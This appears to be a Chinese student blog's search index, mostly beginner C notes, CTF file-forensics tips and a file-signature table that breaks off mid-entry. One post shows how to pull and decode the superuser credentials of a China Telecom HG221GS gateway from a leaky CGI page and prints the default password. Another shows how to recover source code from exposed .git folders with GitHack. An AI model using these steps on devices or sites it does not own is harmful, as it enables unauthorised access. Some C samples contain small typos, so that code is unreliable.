<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[C语言中变量与内存]]></title>
    <url>%2F2019%2F12%2F29%2FC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%8F%98%E9%87%8F%E4%B8%8E%E5%86%85%E5%AD%98%2F</url>
    <content type="text"><![CDATA[每次声明给定类型的变量时，编译器编译器都会给他分配一块足够大的内存空间，来保存该类型的变量。计算机的内存组织为字节。每个变量都会占据一定数量的内存字节，那么储存整数需要几个字节 一个字节为8个二进制位11111111 等于十进制的255 无符号整数范围是0-255 有符号整数范围是-128~+127 如果储存一个人有多少头发，一个字节就不够了。如果储存一个人有多少颗牙，一个字节就足够了，此时在分配更多的字节就是浪费内存带符号的整数类型 类型名称 字节数 signed char 1 short int 2 int 4 long int 4 long long int 8]]></content>
      <categories>
        <category>C语言学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[C语言中变量]]></title>
    <url>%2F2019%2F12%2F29%2FC%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[什么是变量C语言中的变量是指在程序运行时其值可以改变的量，变量的功能就是存储数据。 变量有三个基本要素： 变量名：每一个变量都应该有一个名字。 变量的数据类型：每一个变量都应具有一种数据类型（在定义时指定）内存中占据一定的储存空间 变量的值：变量对应的存贮空间中所存放的数 变量的命名给变量指定的名称一般称为变量名，变量的命名是很有弹性的，它可以是一个或多个大写或小写字母，数字和下划线。但要以字母开头。变量名不能以数字开头，比如8_lk和9_fgjh都是不合法的名称。变量名只能包含字母，下划线和数字，所以**sdfs!及mary-lou都不能做变量名。 存储整数的变量每种变量都用与储存特定类型的数据。比如储存整数的变量整数都是没有小数点的例如：12123 10,999,000,00 20,000 88 1 1.24 2.0 对于计算机来说带点带都号的都不是整数 变量的使用输出薪水问题12345678#include &lt;stdio.h&gt;int main(void)&#123;int salary；salary=1000；printf("我的薪水是%d"，salary)；return 0；&#125; 输出 我的薪水是1000 int salary；这个语句称为变量声明，声明了变量的名称，在这个程序中变量名是salary 这里使用关键字int指定，salary用来存放一个整数，关键字放在变量名之前 %d 他成为变量值的转换说明符 转换说明符总是以%字开头，以便printf（）函数识别他们，，所以如果输出%字符，必须使用转义序列%% 基本运算符 运算符 动作 + 加 — 减 * 乘 / 除 % 取模（取余数） 除法与取模运算取模是一个数除以另一个数的余数。模是计量器产生溢出的量 取模运算 ： a%b=a-(a/b)*b 假设有45块饼干平均分给7个孩子，每个孩子有几块，分完后还剩几块。 123456789101112#include &lt;stdio.h&gt;int main(void)&#123; int cookies=45； int children=7； int perchild=0； int leftover=0； perchild=cookies/children； leftover=cookies%childeren； printf("每个孩子分%d块饼干，还剩%d块饼干"，perchild，leftover)； return 0；&#125; 输出 每个孩子分6块饼干，还剩3块饼干 深入了解整数除法 在执行除法运算时，如果操作数不同号，结果就是负数，因此，表达式-45/7和45/-7的结果相同，都是-6如果操作数同号，都是正。或都是负，结果就是正数 例如：-45/7=-6 45/-7=-6 45-7=6 -45/-7=6 取模运算，不管操作数是否同号，其结果总是和左操作数相同 例如：45%-7=3 -45%7=-3 -45%-7=-3 一元运算符什么是一元运算？答：一元运算只需要一个操作数如：a– a++ !a ~a二元就是 a+b a-b a/b a*b]]></content>
      <categories>
        <category>C语言学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[C语言中计算机的内存]]></title>
    <url>%2F2019%2F12%2F29%2FC%E8%AF%AD%E8%A8%80%E4%B8%AD%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E5%86%85%E5%AD%98%2F</url>
    <content type="text"><![CDATA[计算机内存计算机执行程序时，组成程序的指令和程序所操作的数据都必须储存到某一个地方，这个地方就是计算机内存，也称为主内存，或随机访问储存器。ram是易失性储存器，关闭pc后，储存器的内容就丢失了。可以将计算机的内存想象成一排井然有序的盒子，每个盒子都有两个状态：满为1，空为0.计算机用时用真假表示他们：1为真，0为假。每个盒子称为1个位（bit）,及二进制数的缩写 计算机内存的常用单位是千字节（KB），兆字节(MB)，千字节(GB)。大型磁盘驱动使用兆兆字节(TB)。 1字节=8bit 1KB=1024字节(B) 1MB=1024KB 1GB=1024MB 1TB=1024GB]]></content>
      <categories>
        <category>C语言学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[C语言中的控制符]]></title>
    <url>%2F2019%2F12%2F27%2FC%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%8E%A7%E5%88%B6%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[C语言中的控制符 转义序列 说明 \n 换行 \r 回车 \b 退后一格 \f 换页 \t 水平制表符 \v 垂直制表符 \a 发出鸣响 \？ 插入？ \” 插入” \’ 插入’ \\ 插入\ 试着在屏幕上显示多行文本，在该文件中插入空格。使用\n可以把文本放在多行上，使用\t可以给文本加上空格例如：printf(“12345678”)；输出 12345678 加入\n printf(“1234\n5678”)；输出 12345678 加入\r printf(“1234\r5678”)；输出 5678 三字母序列一般可以直接在字符串中使用？。\?转义序列存在的唯一原因是，有9个特殊的字母序列，称为三字母序列 输入 输出 ??= # ??( [ ??) ] ??/ \ ??&lt; { ??&gt; } ??’ ^ ??! ▕ ??- ~]]></content>
      <categories>
        <category>C语言学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[创建第一个C程序]]></title>
    <url>%2F2019%2F12%2F26%2F%E5%88%9B%E5%BB%BA%E7%AC%AC%E4%B8%80%E4%B8%AAC%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[C程序示例C 程序主要包括以下部分： 预处理器指令 函数 变量 语句 &amp; 表达式 注释 123456#include &lt;stdio.h&gt;int main(void)&#123; printf("Hello world ! \n")； return 0；&#125; 编译执行后会输出 Hello World! 接下来我们讲解一下上面这段程序： 程序的第一行 #include &lt;stdio.h&gt; 严格来说它不是可执行程序的一部分，但它很重要，程序没有它是不执行的。符号#表示这是一个预处理命令，告诉编译器在执行代码之前先做一些操作。预处理指令相当多，一般放在源文件的开头。头文件是包含函数声明定义的文件；你平时写C语言时，用到的printf（） 和scanf()都是系统定义好的，而这些函数的定义就包含在stdio.h这个文件中！ 第二行int main(void) 注意这行代码的末尾没有分号， int表明main函数要返回一个整数作为返回值, 执行完main()函数后的整数值表示返回给操作系统的一个代码，他表示程序的状态。 printf 产生格式化输出的函数（定义在 stdio.h 中），其向终端显示器、控制台等）输出字符。 return 0； 这个return语句结束main()函数执行，把0返回给操作系统 C基本语法C 程序由各种令牌组成，令牌可以是关键字、标识符、常量、字符串值，或者是一个符号。例如，下面的 C 语句包括五个令牌： printf(“Hello, World! \n”)； 这五个令牌分别是：12345printf ( "Hello, World! \n" ) ； 分号 ；在 C 程序中，分号是语句结束符。也就是说，每个语句必须以分号结束，必须用英文的符号。它表明一个逻辑实体的结束。例如，下面是两个不同的语句：12printf("Hello, World! \n")；return 0； 注释C 语言有两种注释方式：以 // 开始的单行注释，这种注释可以单独占一行。 //单行注释 / / 这种格式的注释可以单行或多行。 / 单行注释 / / 多行注释 多行注释 多行注释 / 关键字 在C语言中，关键字是有特殊意义的字，所以在程序中不能将关键字用于其它目的。关键字也称保留字，在前面例子中，int void return都是关键字 关键字 说明 auto 声明自动变量 break 跳出当前循环 case 开关语句分支 char 声明字符型变量或函数返回值类型 const 声明只读变量 continue 结束当前循环，开始下一轮循环 default 开关语句中的”其它”分支 do 循环语句的循环体 double 声明双精度浮点型变量或函数返回值类型 else 条件语句否定分支（与 if 连用） enum 声明枚举类型 extern 声明变量或函数是在其它文件或本文件的其他位置定义 float 声明浮点型变量或函数返回值类型 for 一种循环语句 goto 无条件跳转语句 if 条件语句 int 声明整型变量或函数 long 声明长整型变量或函数返回值类型 register 声明寄存器变量 return 子程序返回语句（可以带参数，也可不带参数） short 声明短整型变量或函数 signed 声明有符号类型变量或函数 sizeof 计算数据类型或变量长度（即所占字节数） static 声明静态变量 struct 声明结构体类型 switch 用于开关语句 typedef 用以给数据类型取别名 unsigned 声明无符号类型变量或函数 union 声明共用体类型 void 声明函数无返回值或无参数，声明无类型指针 volatile 说明变量在程序执行中可被隐含地改变 while 循环语句的循环条件 函数体main()函数的一般结构如图 函数体是在函数名称后面位于起始及结束的两大括号之间的代码，它包含了函数功能的所有语句。]]></content>
      <categories>
        <category>C语言学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[C语言简介]]></title>
    <url>%2F2019%2F12%2F25%2FC%E8%AF%AD%E8%A8%80%E7%AE%80%E4%BB%8B%E5%88%9D%E5%AD%A6%2F</url>
    <content type="text"><![CDATA[C 简介C 语言是一种通用的高级语言，最初是由丹尼斯·里奇在贝尔实验室为开发 UNIX 操作系统而设计的。C 语言最开始是于 1972 年在 DEC PDP-11 计算机上被首次实现。 在 1978 年，布莱恩·柯林汉（Brian Kernighan）和丹尼斯·里奇（Dennis Ritchie）制作了 C 的第一个公开可用的描述，现在被称为 K&amp;R 标准。 UNIX 操作系统，C编译器，和几乎所有的 UNIX 应用程序都是用 C 语言编写的。由于各种原因，C 语言现在已经成为一种广泛使用的专业语言。c语言是一种功能强大。简洁的计算机语言，通过它可以编写程序，指定计算机完成指定的任务。我们可以利用c语言创建程序，并让计算机以指令行事， 为什么要使用 C？我是因为专接本的需要😭C 语言最初是用于系统开发工作，特别是组成操作系统的程序。游戏开发， C语言的编译器 Windows：windows下编译器众多，建议使用（Dev C++ ,Visual C++ 6.0) Linux: 使用Gcc编译 Mac os: 使用Xcode编写 Androad :c语言编译器，或者在termux下安装Gcc环境如何创建C程序？C程序的创建步骤有4个基本步骤 编辑 编译 链接 执行 编辑：编辑过程就是创建C程序源代码。 编译：编译器就像一个翻译软件，能把C语言源代码翻译成机器语言也就是（二进制文件），在编译过程中，会找出错误并报告，这个过程就是编译过程 链接：C语言代码经过编译后，并没有生成最终的可执行文件,而是生成了一种目标文件的中间文件。目标文件也是二进制文件,目标文件经过链接才能变成可执行文件。 执行：当成功完成前述三个后，运行程序。但是，这个阶段会出现各种错误，包括输出错误及什么也不做，甚至使计算机崩溃，不管出现那种情况都要返回编辑阶段，检查并修改源代码。 问答既然目标文件和可执行文件格式是一样的，为什么还要在链接一次，直接作为可执行文件不行吗？ 答：不行的，因为编译只是将我们自己写的代码变成了二进制形式，他还需要和其他系统组件（比如标准库 动态链接库等等）结合起来，这些组件都是程序运行所必需的。]]></content>
      <categories>
        <category>C语言学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[校园网的天翼网关获取超级用户]]></title>
    <url>%2F2019%2F10%2F26%2F%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3%E8%8E%B7%E5%8F%96%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[前言刚开学不久，上一届学生应该是校园网到期了，把电信的光猫路由器扔了，正好上楼梯在垃圾桶旁，我看到就捡走了，拿回去还可以做路由器有，拿回去才发现路由器的后台功能也就能改一个wifi的名字而已，一些路由器的基本功能都没有，后来我打算直接用ttl线刷固件，在网上搜他的型号时发现他还有一个超级用户，这个用户是为了安装宽带时用的，根据自己的经验和一些线索，找到了超级用户的用户名和密码，从而达到了自己想用的功能 破解步骤 根据设备型号HG221GS，上网查找资料，参考网上的方法，输入：http://192.168.1.1:8080/cgi-bin/baseinfoSet.cgi 打开后找到关键信息 1234"baseinfoSet_TELECOMACCOUNT":"telecomadmin", "baseinfoSet_TELECOMPASSWORD":"114&amp;73&amp;55&amp;110&amp;69&amp;37&amp;53&amp;113&amp;", "baseinfoSet_USERACCOUNT":"useradmin", "baseinfoSet_USERPASSWORD":"106&amp;110&amp;117&amp;122&amp;50&amp;", 通过观察9CD2H与57&amp;71&amp;72&amp;50&amp;76&amp;的对应关系（ASCII码），进行解码，如下所示： 12345678code='114&amp;73&amp;55&amp;110&amp;69&amp;37&amp;53&amp;113&amp;'[:-1] # "baseinfoSet_TELECOMPASSWORD":"114&amp;73&amp;55&amp;110&amp;69&amp;37&amp;53&amp;113&amp;" list=map(int,code.split('&amp;')) result=[] for i in list: if i &gt; 57: i-=4 result.append(chr(i)) print (''.join(result)) # output password:nE7jA%5m 找个python的线上编辑器，运行上述代码，得到默认密码nE7jA%5m 输入超级管理员账号：telecomadmin 密码： nE7jA%5m 登陆成功]]></content>
      <categories>
        <category>搞机笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git信息泄露]]></title>
    <url>%2F2019%2F10%2F26%2FGit%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%2F</url>
    <content type="text"><![CDATA[前言git是一个开源分布式版本控制系统，可以有效，高速的处理从很小到非常大的文件项目版本管理 官网：https://git-scm.com 可以通过git init创建一个仓库Git信息泄露的原理 通过泄露的.git文件夹下的文件，可以还原重建工程源码。 新建仓库下会有.git/index 文件，解析.git/index 文件，找到工程中所有的文件名为：（文件sha1） 可以在.git/index文件夹下下载对应的文件 zlib解压文件，按原始的目录结构写入源代码 拿到源代码后，可以进一步进行代码审计，从而发现安全漏洞 Git实验环境搭建将git init 目录下的内容部署到http服务器上，保留，git目录。git add 文件名、git commit -m “版本信息” Git信息泄露利用下载GitHack1git clone https://github.com/lijiejie/GitHack.git 使用1GitHack.py http://网址/.git]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF入门文件合并]]></title>
    <url>%2F2019%2F10%2F09%2FCTF%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6%2F</url>
    <content type="text"><![CDATA[文件合并 在linux12345cat 合并的文件 &gt; 输出的文件多文件合并：cat 文件1 文件2 文件3 &gt; 输出文件4完整性检测：# md5sum 文件名 windows下文件合并 123# copy /B 合并文件1+合并文件2 输出文件名完整性加测：certutil -hashfile 文件名 md5]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF入门“文件分离”]]></title>
    <url>%2F2019%2F09%2F23%2FCTF%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%2F</url>
    <content type="text"><![CDATA[CTF比赛中常有与隐写术相关的题目出现，以图片为载体 binwalk工具分析1binwalk 文件名 分离文件1binwalk -e 文件名 foremost如果用binwalk无法正确分离出文件，可以使用foremost 1foremost 文件名 -o 输出目录名 dd当文件自动分离出错时，可以使用dd命令分离出隐藏文件 12345dd if=源文件 of=目标文件 bs=1 skip=开始分离的字节数参数 if=输入文件名，缺省为标准输出 of=输出文件名，缺省为标准输出 bs=同时设置读写块的大小为bytes，可以替ibs和obs spik=从输入文件开头跳过blocks个块后面开始复制 foremost如果闲dd麻烦可以用hex编辑工具. 将某开区域保存方式如下]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF入门"文件类型识别"]]></title>
    <url>%2F2019%2F09%2F23%2FCTF%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[file命令当文件没有后缀或者有后缀名而无法打开，根据识别出的文件类型，来修改再打开格式1file 文件名 010 Editor010 Editor是一款功能强大的代码编辑器,使用可帮助用户轻松编辑任何文件、驱动器或进程的文本和十六进制代码。旨在快速轻松地编辑计算机上任何文件的内容 winhex通过winhex程序中可以查看文件头类型，根据文件头类型判断出文件类型]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[16进制的文件头信息搜集]]></title>
    <url>%2F2019%2F09%2F21%2F16%E8%BF%9B%E5%88%B6%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[扩展名 文件头标识（HEX） 文件描述 123 00 00 1A 00 05 10 04 Lotus 1-2-3 spreadsheet (v9) file 3gg; 3gp; 3g2 00 00 00 nn 66 74 79 70 33 67 70 3rd Generation Partnership Project 3GPP (nn=0x14) and 3GPP2 (nn=0x20) multimedia files 7z 37 7A BC AF 27 1C 7-ZIP compressed file aba 00 01 42 41 Palm Address Book Archive file abi 41 4F 4C 49 4E 44 45 58 AOL address book index file aby; idx 41 4F 4C 44 42 AOL database files: address book (ABY) and user configuration data (MAIN.IDX) accdb 00 01 00 00 53 74 61 6E 64 61 72 64 20 41 43 45 20 44 42 Microsoft Access 2007 file ACM 4D 5A MS audio compression manager driver ADF 44 4F 53 Amiga disk file adx 03 00 00 00 41 50 50 52 Lotus Approach ADX file AIFF 46 4F 52 4D 00 Audio Interchange File ain 21 12 AIN Compressed Archive File ami 5B 76 65 72 5D Lotus Ami Pro amr 23 21 41 4D 52 Adaptive Multi-Rate ACELP (Algebraic Code Excited Linear Prediction) Codec, commonly audio format with GSM cell phones ANI 52 49 46 46 API 4D 5A 90 00 03 00 00 00 Acrobat plug-in arc 1A 0x LH archive file, old version(where x = 0x2, 0x3, 0x4, 0x8 or 0x9 for types 1-5, respectively) arc 41 72 43 01 FreeArc compressed file arj 60 EA ARJ Compressed Archive ARJ 60 EA 27 ART 4A 47 03 0E 00 00 00 AOL ART file ART 4A 47 04 0E 00 00 00 AOL ART file asf 30 26 B2 75 8E 66 CF 11 Windows Media asf; wma; wmv 30 26 B2 75 8E 66 CF 11 A6 D9 00 AA 00 62 CE 6C Microsoft Windows Media Audio/Video File(Advanced Streaming Format) asx 3C Advanced Stream redirector file au 2E 73 6E 64 SoundMachine Audio File NeXT/Sun Microsystems μ-Law audio file avi 41 56 49 20 Audio Video Interleave (AVI) AX 4D 5A Library cache file AX 4D 5A 90 00 03 00 00 00 DirectShow filter bag 41 4F 4C 20 46 65 65 64 62 61 67 AOL and AIM buddy list file BAS 20 20 20 bin 42 4C 49 32 32 33 51 Thomson Speedtouch series WLAN router firmware bmp 42 4D Windows Bitmap BMP 42 4D 3E bz; bz2 42 5A 68 BZIP Archive BZ2; TAR.BZ2; TBZ2; TB2 42 5A 68 bzip2 compressed archive CAB 49 53 63 CAB; HDR 49 53 63 28 Install Shield v5.x or 6.x compressed file CAB 4D 53 43 46 Microsoft CAB File Format cat 30 Microsoft security catalog file CBD 43 42 46 49 4C 45 WordPerfect dictionary file (unconfirmed) CCD 5B 43 6C cdr CDR Corel Draw CDR 45 4C 49 54 45 20 43 6F 6D 6D 61 6E 64 65 72 20 Elite Plus Commander saved game file CDR, DVF 4D 53 5F 56 4F 49 43 45 Sony Compressed Voice File CHI; CHM 49 54 53 46 Microsoft Compiled HTML Help File CHM 49 54 53 CLB 43 4D 58 31 Corel Binary metafile CLB 43 4F 4D 2B COM+ Catalog file cnt 3A 42 61 73 65 COM, DLL, DRV, EXE, PIF, QTS, QTX, SYS 4D 5A Windows/DOS executable file COM 4D 5A EE COM E9 3B 03 CPE 46 41 58 43 4F 56 45 52 2D 56 45 52 Microsoft Fax Cover Sheet CPL 4D 5A Control panel application CPT 43 50 54 37 46 49 4C 45 Corel Photopaint file CPT 43 50 54 46 49 4C 45 Corel Photopaint file CPX 5B 57 69 cru; crush 43 52 55 53 48 CRUSH Archive File CRU 43 52 55 53 48 20 76 Crush compressed archive CRW 49 49 1A 00 00 00 48 45 41 50 43 43 44 52 02 00 Canon digital camera RAW file CTF 43 61 74 61 6C 6F 67 20 33 2E 30 30 00 WhereIsIt Catalog file CUR 00 00 02 00 01 00 20 20 Windows cursor file dat 03 MapInfo Native Data Format dat 1A 52 54 53 20 43 4F 4D 50 52 45 53 53 45 44 20 49 4D 41 47 45 20 56 31 2E 30 1A Runtime Software disk image dat 41 56 47 36 5F 49 6E 74 65 67 72 69 74 79 5F 44 61 74 61 62 61 73 65 AVG6 Integrity database file DAT 43 52 45 47 Windows 9x registry hive DAT 43 6C 69 65 6E 74 20 55 72 6C 43 61 63 68 65 20 4D 4D 46 20 56 65 72 20 IE History DAT file DAT 45 52 46 53 53 41 56 45 44 41 54 41 46 49 4C 45 Kroll EasyRecovery Saved Recovery State file DAT 49 6E 6E 6F 20 53 65 74 75 70 20 55 6E 69 6E 73 74 61 6C 6C 20 4C 6F 67 20 28 62 29 Inno Setup Uninstall Log file db 00 06 15 61 00 00 00 02 00 00 04 D2 00 00 10 00 Netscape Navigator (v4) database file DB 44 42 46 48 Palm Zire photo database db 08 dBASE IV or dBFast configuration file db3 03 dBASE III file db4 04 dBASE IV data file dba 00 01 42 44 Palm DateBook Archive file dbx CF AD 12 FE dbx CF AD 12 FE C5 FD 74 6F Outlook Express dci 3C 21 64 6F 63 74 79 70 AOL HTML mail file dcx 3A DE 68 B1 DCX Graphic File DDB 00 01 00 dib 42 4D device-independent bitmap image DLL 4D 5A 90 DMP 4D 44 4D 50 93 A7 Windows minidump file DMS 44 4D 53 21 Amiga DiskMasher compressed archive doc 0D 44 4F 43 DeskMate Document file doc 12 34 56 78 90 FF MS Word 6.0 doc 31 BE 00 00 00 AB 00 00 MS Word for DOS 6.0 doc 7F FE 34 0A MS Word dot; ppt; xla; ppa; pps; pot; msi; sdw; db D0 CF 11 E0 MS Office/OLE2 doc; dot; xls; xlt; xla; ppt; apr ;ppa; pps; pot; msi; sdw; db D0 CF 11 E0 A1 B1 1A E1 MS Compound Document v1 or Lotus Approach APR file DPL 4D 5A 50 DRV 4D 5A 16 drw 07 A common signature and file extension for many drawing programs. drw 01 FF 02 04 03 02 Micrografx vector graphic file ds4 4D 47 58 20 69 74 70 64 Micrografix Designer 4 DSN 4D 56 CD Stomper Pro label file dsp 23 20 4D 69 63 72 6F 73 6F 66 74 20 44 65 76 6 56C 6F 70 65 72 20 53 74 75 64 69 6F Microsoft Developer Studio project file dss 02 64 73 73 Digital Speech Standard (Olympus, Grundig, &amp; Phillips) dtd 07 64 74 32 64 64 74 64 DesignTools 2D Design file dtd 3C 21 45 4E 54 49 54 59 XML DTD DVR 44 56 44 DVR-Studio stream file dwg 41 43 31 Enn (where nn are numbers) 45 56 46 EnCase evidence file ECO 2A 50 52 elf 7F 45 4C 46 01 01 01 00 ELF Executable emf 01 00 00 00 58 00 00 00 Extended (Enhanced) Windows Metafile Format, printer spool file eml 44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A Email EML 46 72 6F 6D 20 20 20 A commmon file extension for e-mail files. Signatures shown here are for Netscape, Eudora, and a generic signature, respectively. EML is also used by Outlook Express and QuickMail. EML 46 72 6F 6D 20 3F 3F 3F A commmon file extension for e-mail files. Signatures shown here are for Netscape, Eudora, and a generic signature, respectively. EML is also used by Outlook Express and QuickMail. EML 46 72 6F 6D 3A 20 A commmon file extension for e-mail files. Signatures shown here are for Netscape, Eudora, and a generic signature, respectively. EML is also used by Outlook Express and QuickMail. EML 52 65 63 enc 00 5C 41 B1 FF Mujahideen Secrets 2 encrypted file enl [32 byte offset] 40 40 40 20 00 00 40 40 40 40 EndNote Library File eps 25 21 50 53 Adobe EPS File eps 25 21 50 53 2D 41 64 6F 62 65 Postscript eps 25 21 50 53 2D 41 64 6F 62 65 2D 33 2E 30 20 45 50 53 46 2D 33 20 30 Adobe encapsulated PostScript file (If this signature is not at the immediate beginning of the file, it will occur early in the file, commonly at byte offset 30) EPS C5 D0 D3 eth 1A 35 01 00 GN Nettest WinPharoah capture file evt 30 00 00 00 4C 66 4C 65 Windows Event Viewer file evt 03 00 00 00 C4 66 C4 56 EVTX 45 6C 66 46 69 6C 65 00 Windows Vista event log file exe; dll; drv; vxd; sys; ocx; vbx 4D 5A Win32 Executable exe; dll; drv; vxd; sys; ocx; vbx 4D 5A Win16 Executable exe; com; 386; ax; acm; sys; dll; drv; flt; fon; ocx; scr; lrc; vxd; cpl; x32 4D 5A Executable File EXE, DLL, OCX, OLB, IMM, IME 4D 5A 90 fli 00 11 AF FLIC Animation file flt 00 01 01 OpenFlight 3D file FLT 4D 5A 90 00 03 00 00 00 Audition graphic filter file (Adobe) FLV 46 4C 56 01 Flash video file fm 3C 4D 61 6B 65 72 46 69 6C 65 20 Adobe FrameMaker file fm3 00 00 1A 00 07 80 01 00 Lotus 123 v3 FMT file fmt 20 00 68 00 20 0 Lotus 123 v4 FMT file FNT 43 48 41 FON 4D 5A Font file GBC 87 F5 3E gid 3F 5F 03 00 Windows Help Index File GID 4C 4E 02 00 Windows Help index file GIF 47 49 46 38 gif 47 49 46 38 37 61 Graphics interchange format file (GIF 87A) gif 47 49 46 38 39 61 Graphics interchange format file (GIF89A) GTD 7B 50 72 GX2 47 58 32 Show Partner graphics file (not confirmed) gz; tar; tgz 1F 8B Gzip Archive File gz; tgz 1F 8B 08 GZ Compressed File hap 91 33 48 46 HAP Archive File HDMP 4D 44 4D 50 93 A7 Windows heap dump file hdr 23 3F 52 41 44 49 41 4E 43 45 0A adiance High Dynamic Range image file HLP 3F 5F 03 hlp 3F 5F 03 00 Windows Help file HLP 4C 4E 02 00 Windows Help file hlp [7 byte offset] 00 00 FF FF FF FF Windows Help file hqx 28 54 68 69 73 20 66 69 6C 65 Macintosh BinHex 4 Compressed Archive hqx 28 54 68 69 73 20 66 69 6C 65 20 6D 75 73 74 20 62 65 20 63 6F 6E 76 65 72 74 65 64 20 77 69 74 68 20 42 69 6E 48 65 78 20 Macintosh BinHex 4 Compressed Archive HTM 3C 21 44 htm; html 3C 21 44 4F 43 54 HyperText Markup Language 3 htm; html 3C 48 54 4D 4C 3E HyperText Markup Language 2 htm; html 3C 68 74 6D 6C 3E HyperText Markup Language 1 html 68 74 6D 6C 3E HTML ico 00 00 01 00 00 Icon File ico 00 00 01 00 01 00 20 20 Icon File IFF 46 4F 52 4D IFO 44 56 44 DVD info file IME 4D 5A 90 img 00 01 00 08 00 01 00 01 01 Ventura Publisher/GEM VDI Image Format Bitmap file IMG 00 FF FF IMM 4D 5A 90 ind 41 4F 4C 49 44 58 AOL client preferences/settings file (MAIN.IND) ISO 43 44 30 30 31 ISO-9660 CD Disc Image (This signature usually occurs at byte 8001, 8801, or 9001.) ivr 2E 52 45 43 RealPlayer video file (V11 and later) JAR 4A 41 52 43 53 00 JARCS compressed archive jar 5F 27 A8 89 JAR Archive File jpg; jpeg FF D8 FF jpg; jpe; jpeg FF D8 FF E0 00 JPG Graphic File jpg; jpe; jpeg FF D8 FF FE 00 JPG Graphic File KGB 4B 47 42 5F 61 72 63 68 20 2D KGB archive KOZ 49 44 33 03 00 00 00 Sprint Music Store audio file (for mobile devices) LDB 42 49 4C lha 2D 6C 68 35 2D LHA Compressed lha; lzh [2 byte offset] 2D 6C 68 Compressed archive file LHP 3F 5F 03 lhp 3F 5F 03 00 Windows Help File lib 21 3C 61 72 63 68 3E 0A Unix archiver (ar) files and Microsoft Program Library Common Object File Format (COFF) LIB 2A 24 20 LIT 49 54 4F 4C 49 54 4C 53 Microsoft Reader eBook file LNK 4C 00 00 lnk 4C 00 00 00 Windows Shortcut (Link File) lnk 4C 00 00 00 01 14 02 Windows Link File LNK 4C 00 00 00 01 14 02 00 Windows shortcut file log 2A 2A 2A 20 20 49 6E 73 74 61 6C 6C 61 74 69 6F 6E 20 53 74 61 72 74 65 64 20 Symantec Wise Installer log file lzh lh Lz compression file lwp 57 6F 72 64 50 72 6F Lotus WordPro v9 m3u 23 45 58 m4a 00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00 Apple Lossless Audio Codec file m4a; m4v 00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00 QuickTime M4A/M4V file manifest 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D Windows Visual Stylesheet XML file MAR 4D 41 52 31 00 Mozilla archive MAR 4D 41 52 43 Microsoft/MSN MARC archive MAR 4D 41 72 30 00 MAr compressed archive max D0 CF 11 mdb 00 01 00 00 53 74 61 6E 64 61 72 64 20 4A 65 74 20 44 42 Microsoft Access file mdb; mda; mde; mdt 53 74 61 6E 64 61 72 64 20 4A MS Access MDF 00 FF FF mdf 00 FF FF FF FF FF FF FF FF FF FF 00 00 02 00 01 Alcohol 120% CD image mdf 01 0F 00 00 Microsoft SQL Server 2000 database MDI 45 50 Microsoft Document Imaging file MDS 4D 45 44 MID; MIDI 4D 54 68 64 Musical Instrument Digital Interface (MIDI) sound file mkv 1A 45 DF A3 93 42 82 88 6D 61 74 72 6F 73 6B 61 Matroska stream file MLS 4D 49 4C 45 53 Milestones v1.0 project management and scheduling software (Also see “MV2C” and “MV214” signatures) MLS 4D 4C 53 57 Skype localization data file MLS 4D 56 32 31 34 Milestones v2.1b project management and scheduling software (Also see “MILES” and “MV2C” signatures) MLS 4D 56 32 43 Milestones v2.1a project management and scheduling software (Also see “MILES” and “MV214” signatures) MMF 4D 4D 4D 44 00 00 Yamaha Corp. Synthetic music Mobile Application Format (SMAF) for multimedia files that can be played on hand-held devices. mny 00 01 00 00 4D 53 49 53 41 4D 20 44 61 74 61 62 61 73 65 Microsoft Money file MOV 00 00 0F MOV 00 00 77 mov 6D 6F 6F 76 Quicktime mov 6D 64 61 74 QuickTime Movie mp 0C ED Monochrome Picture TIFF bitmap file (unconfirmed) MP3 49 44 33 MPEG-1 Audio Layer 3 (MP3) audio file MP3 FF FB 50 mp4 00 00 00 18 66 74 79 70 33 67 70 35 MPEG-4 video files MPA 00 00 01 mpg; mpeg 00 00 01 B3 MPEG Movie mpg 00 00 01 BA MPEG MSC 3C 3F 78 msc 3C 3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E 30 22 3F 3E 0D 0A 3C 4D 4D 43 5F 43 6F 6E 73 6F 6C 65 46 69 6C 65 20 43 6F 6E 73 6F 6C 65 56 65 72 73 69 6F 6E 3D 22 Microsoft Management Console Snap-in Control file msi 23 20 Cerius2 file MSV 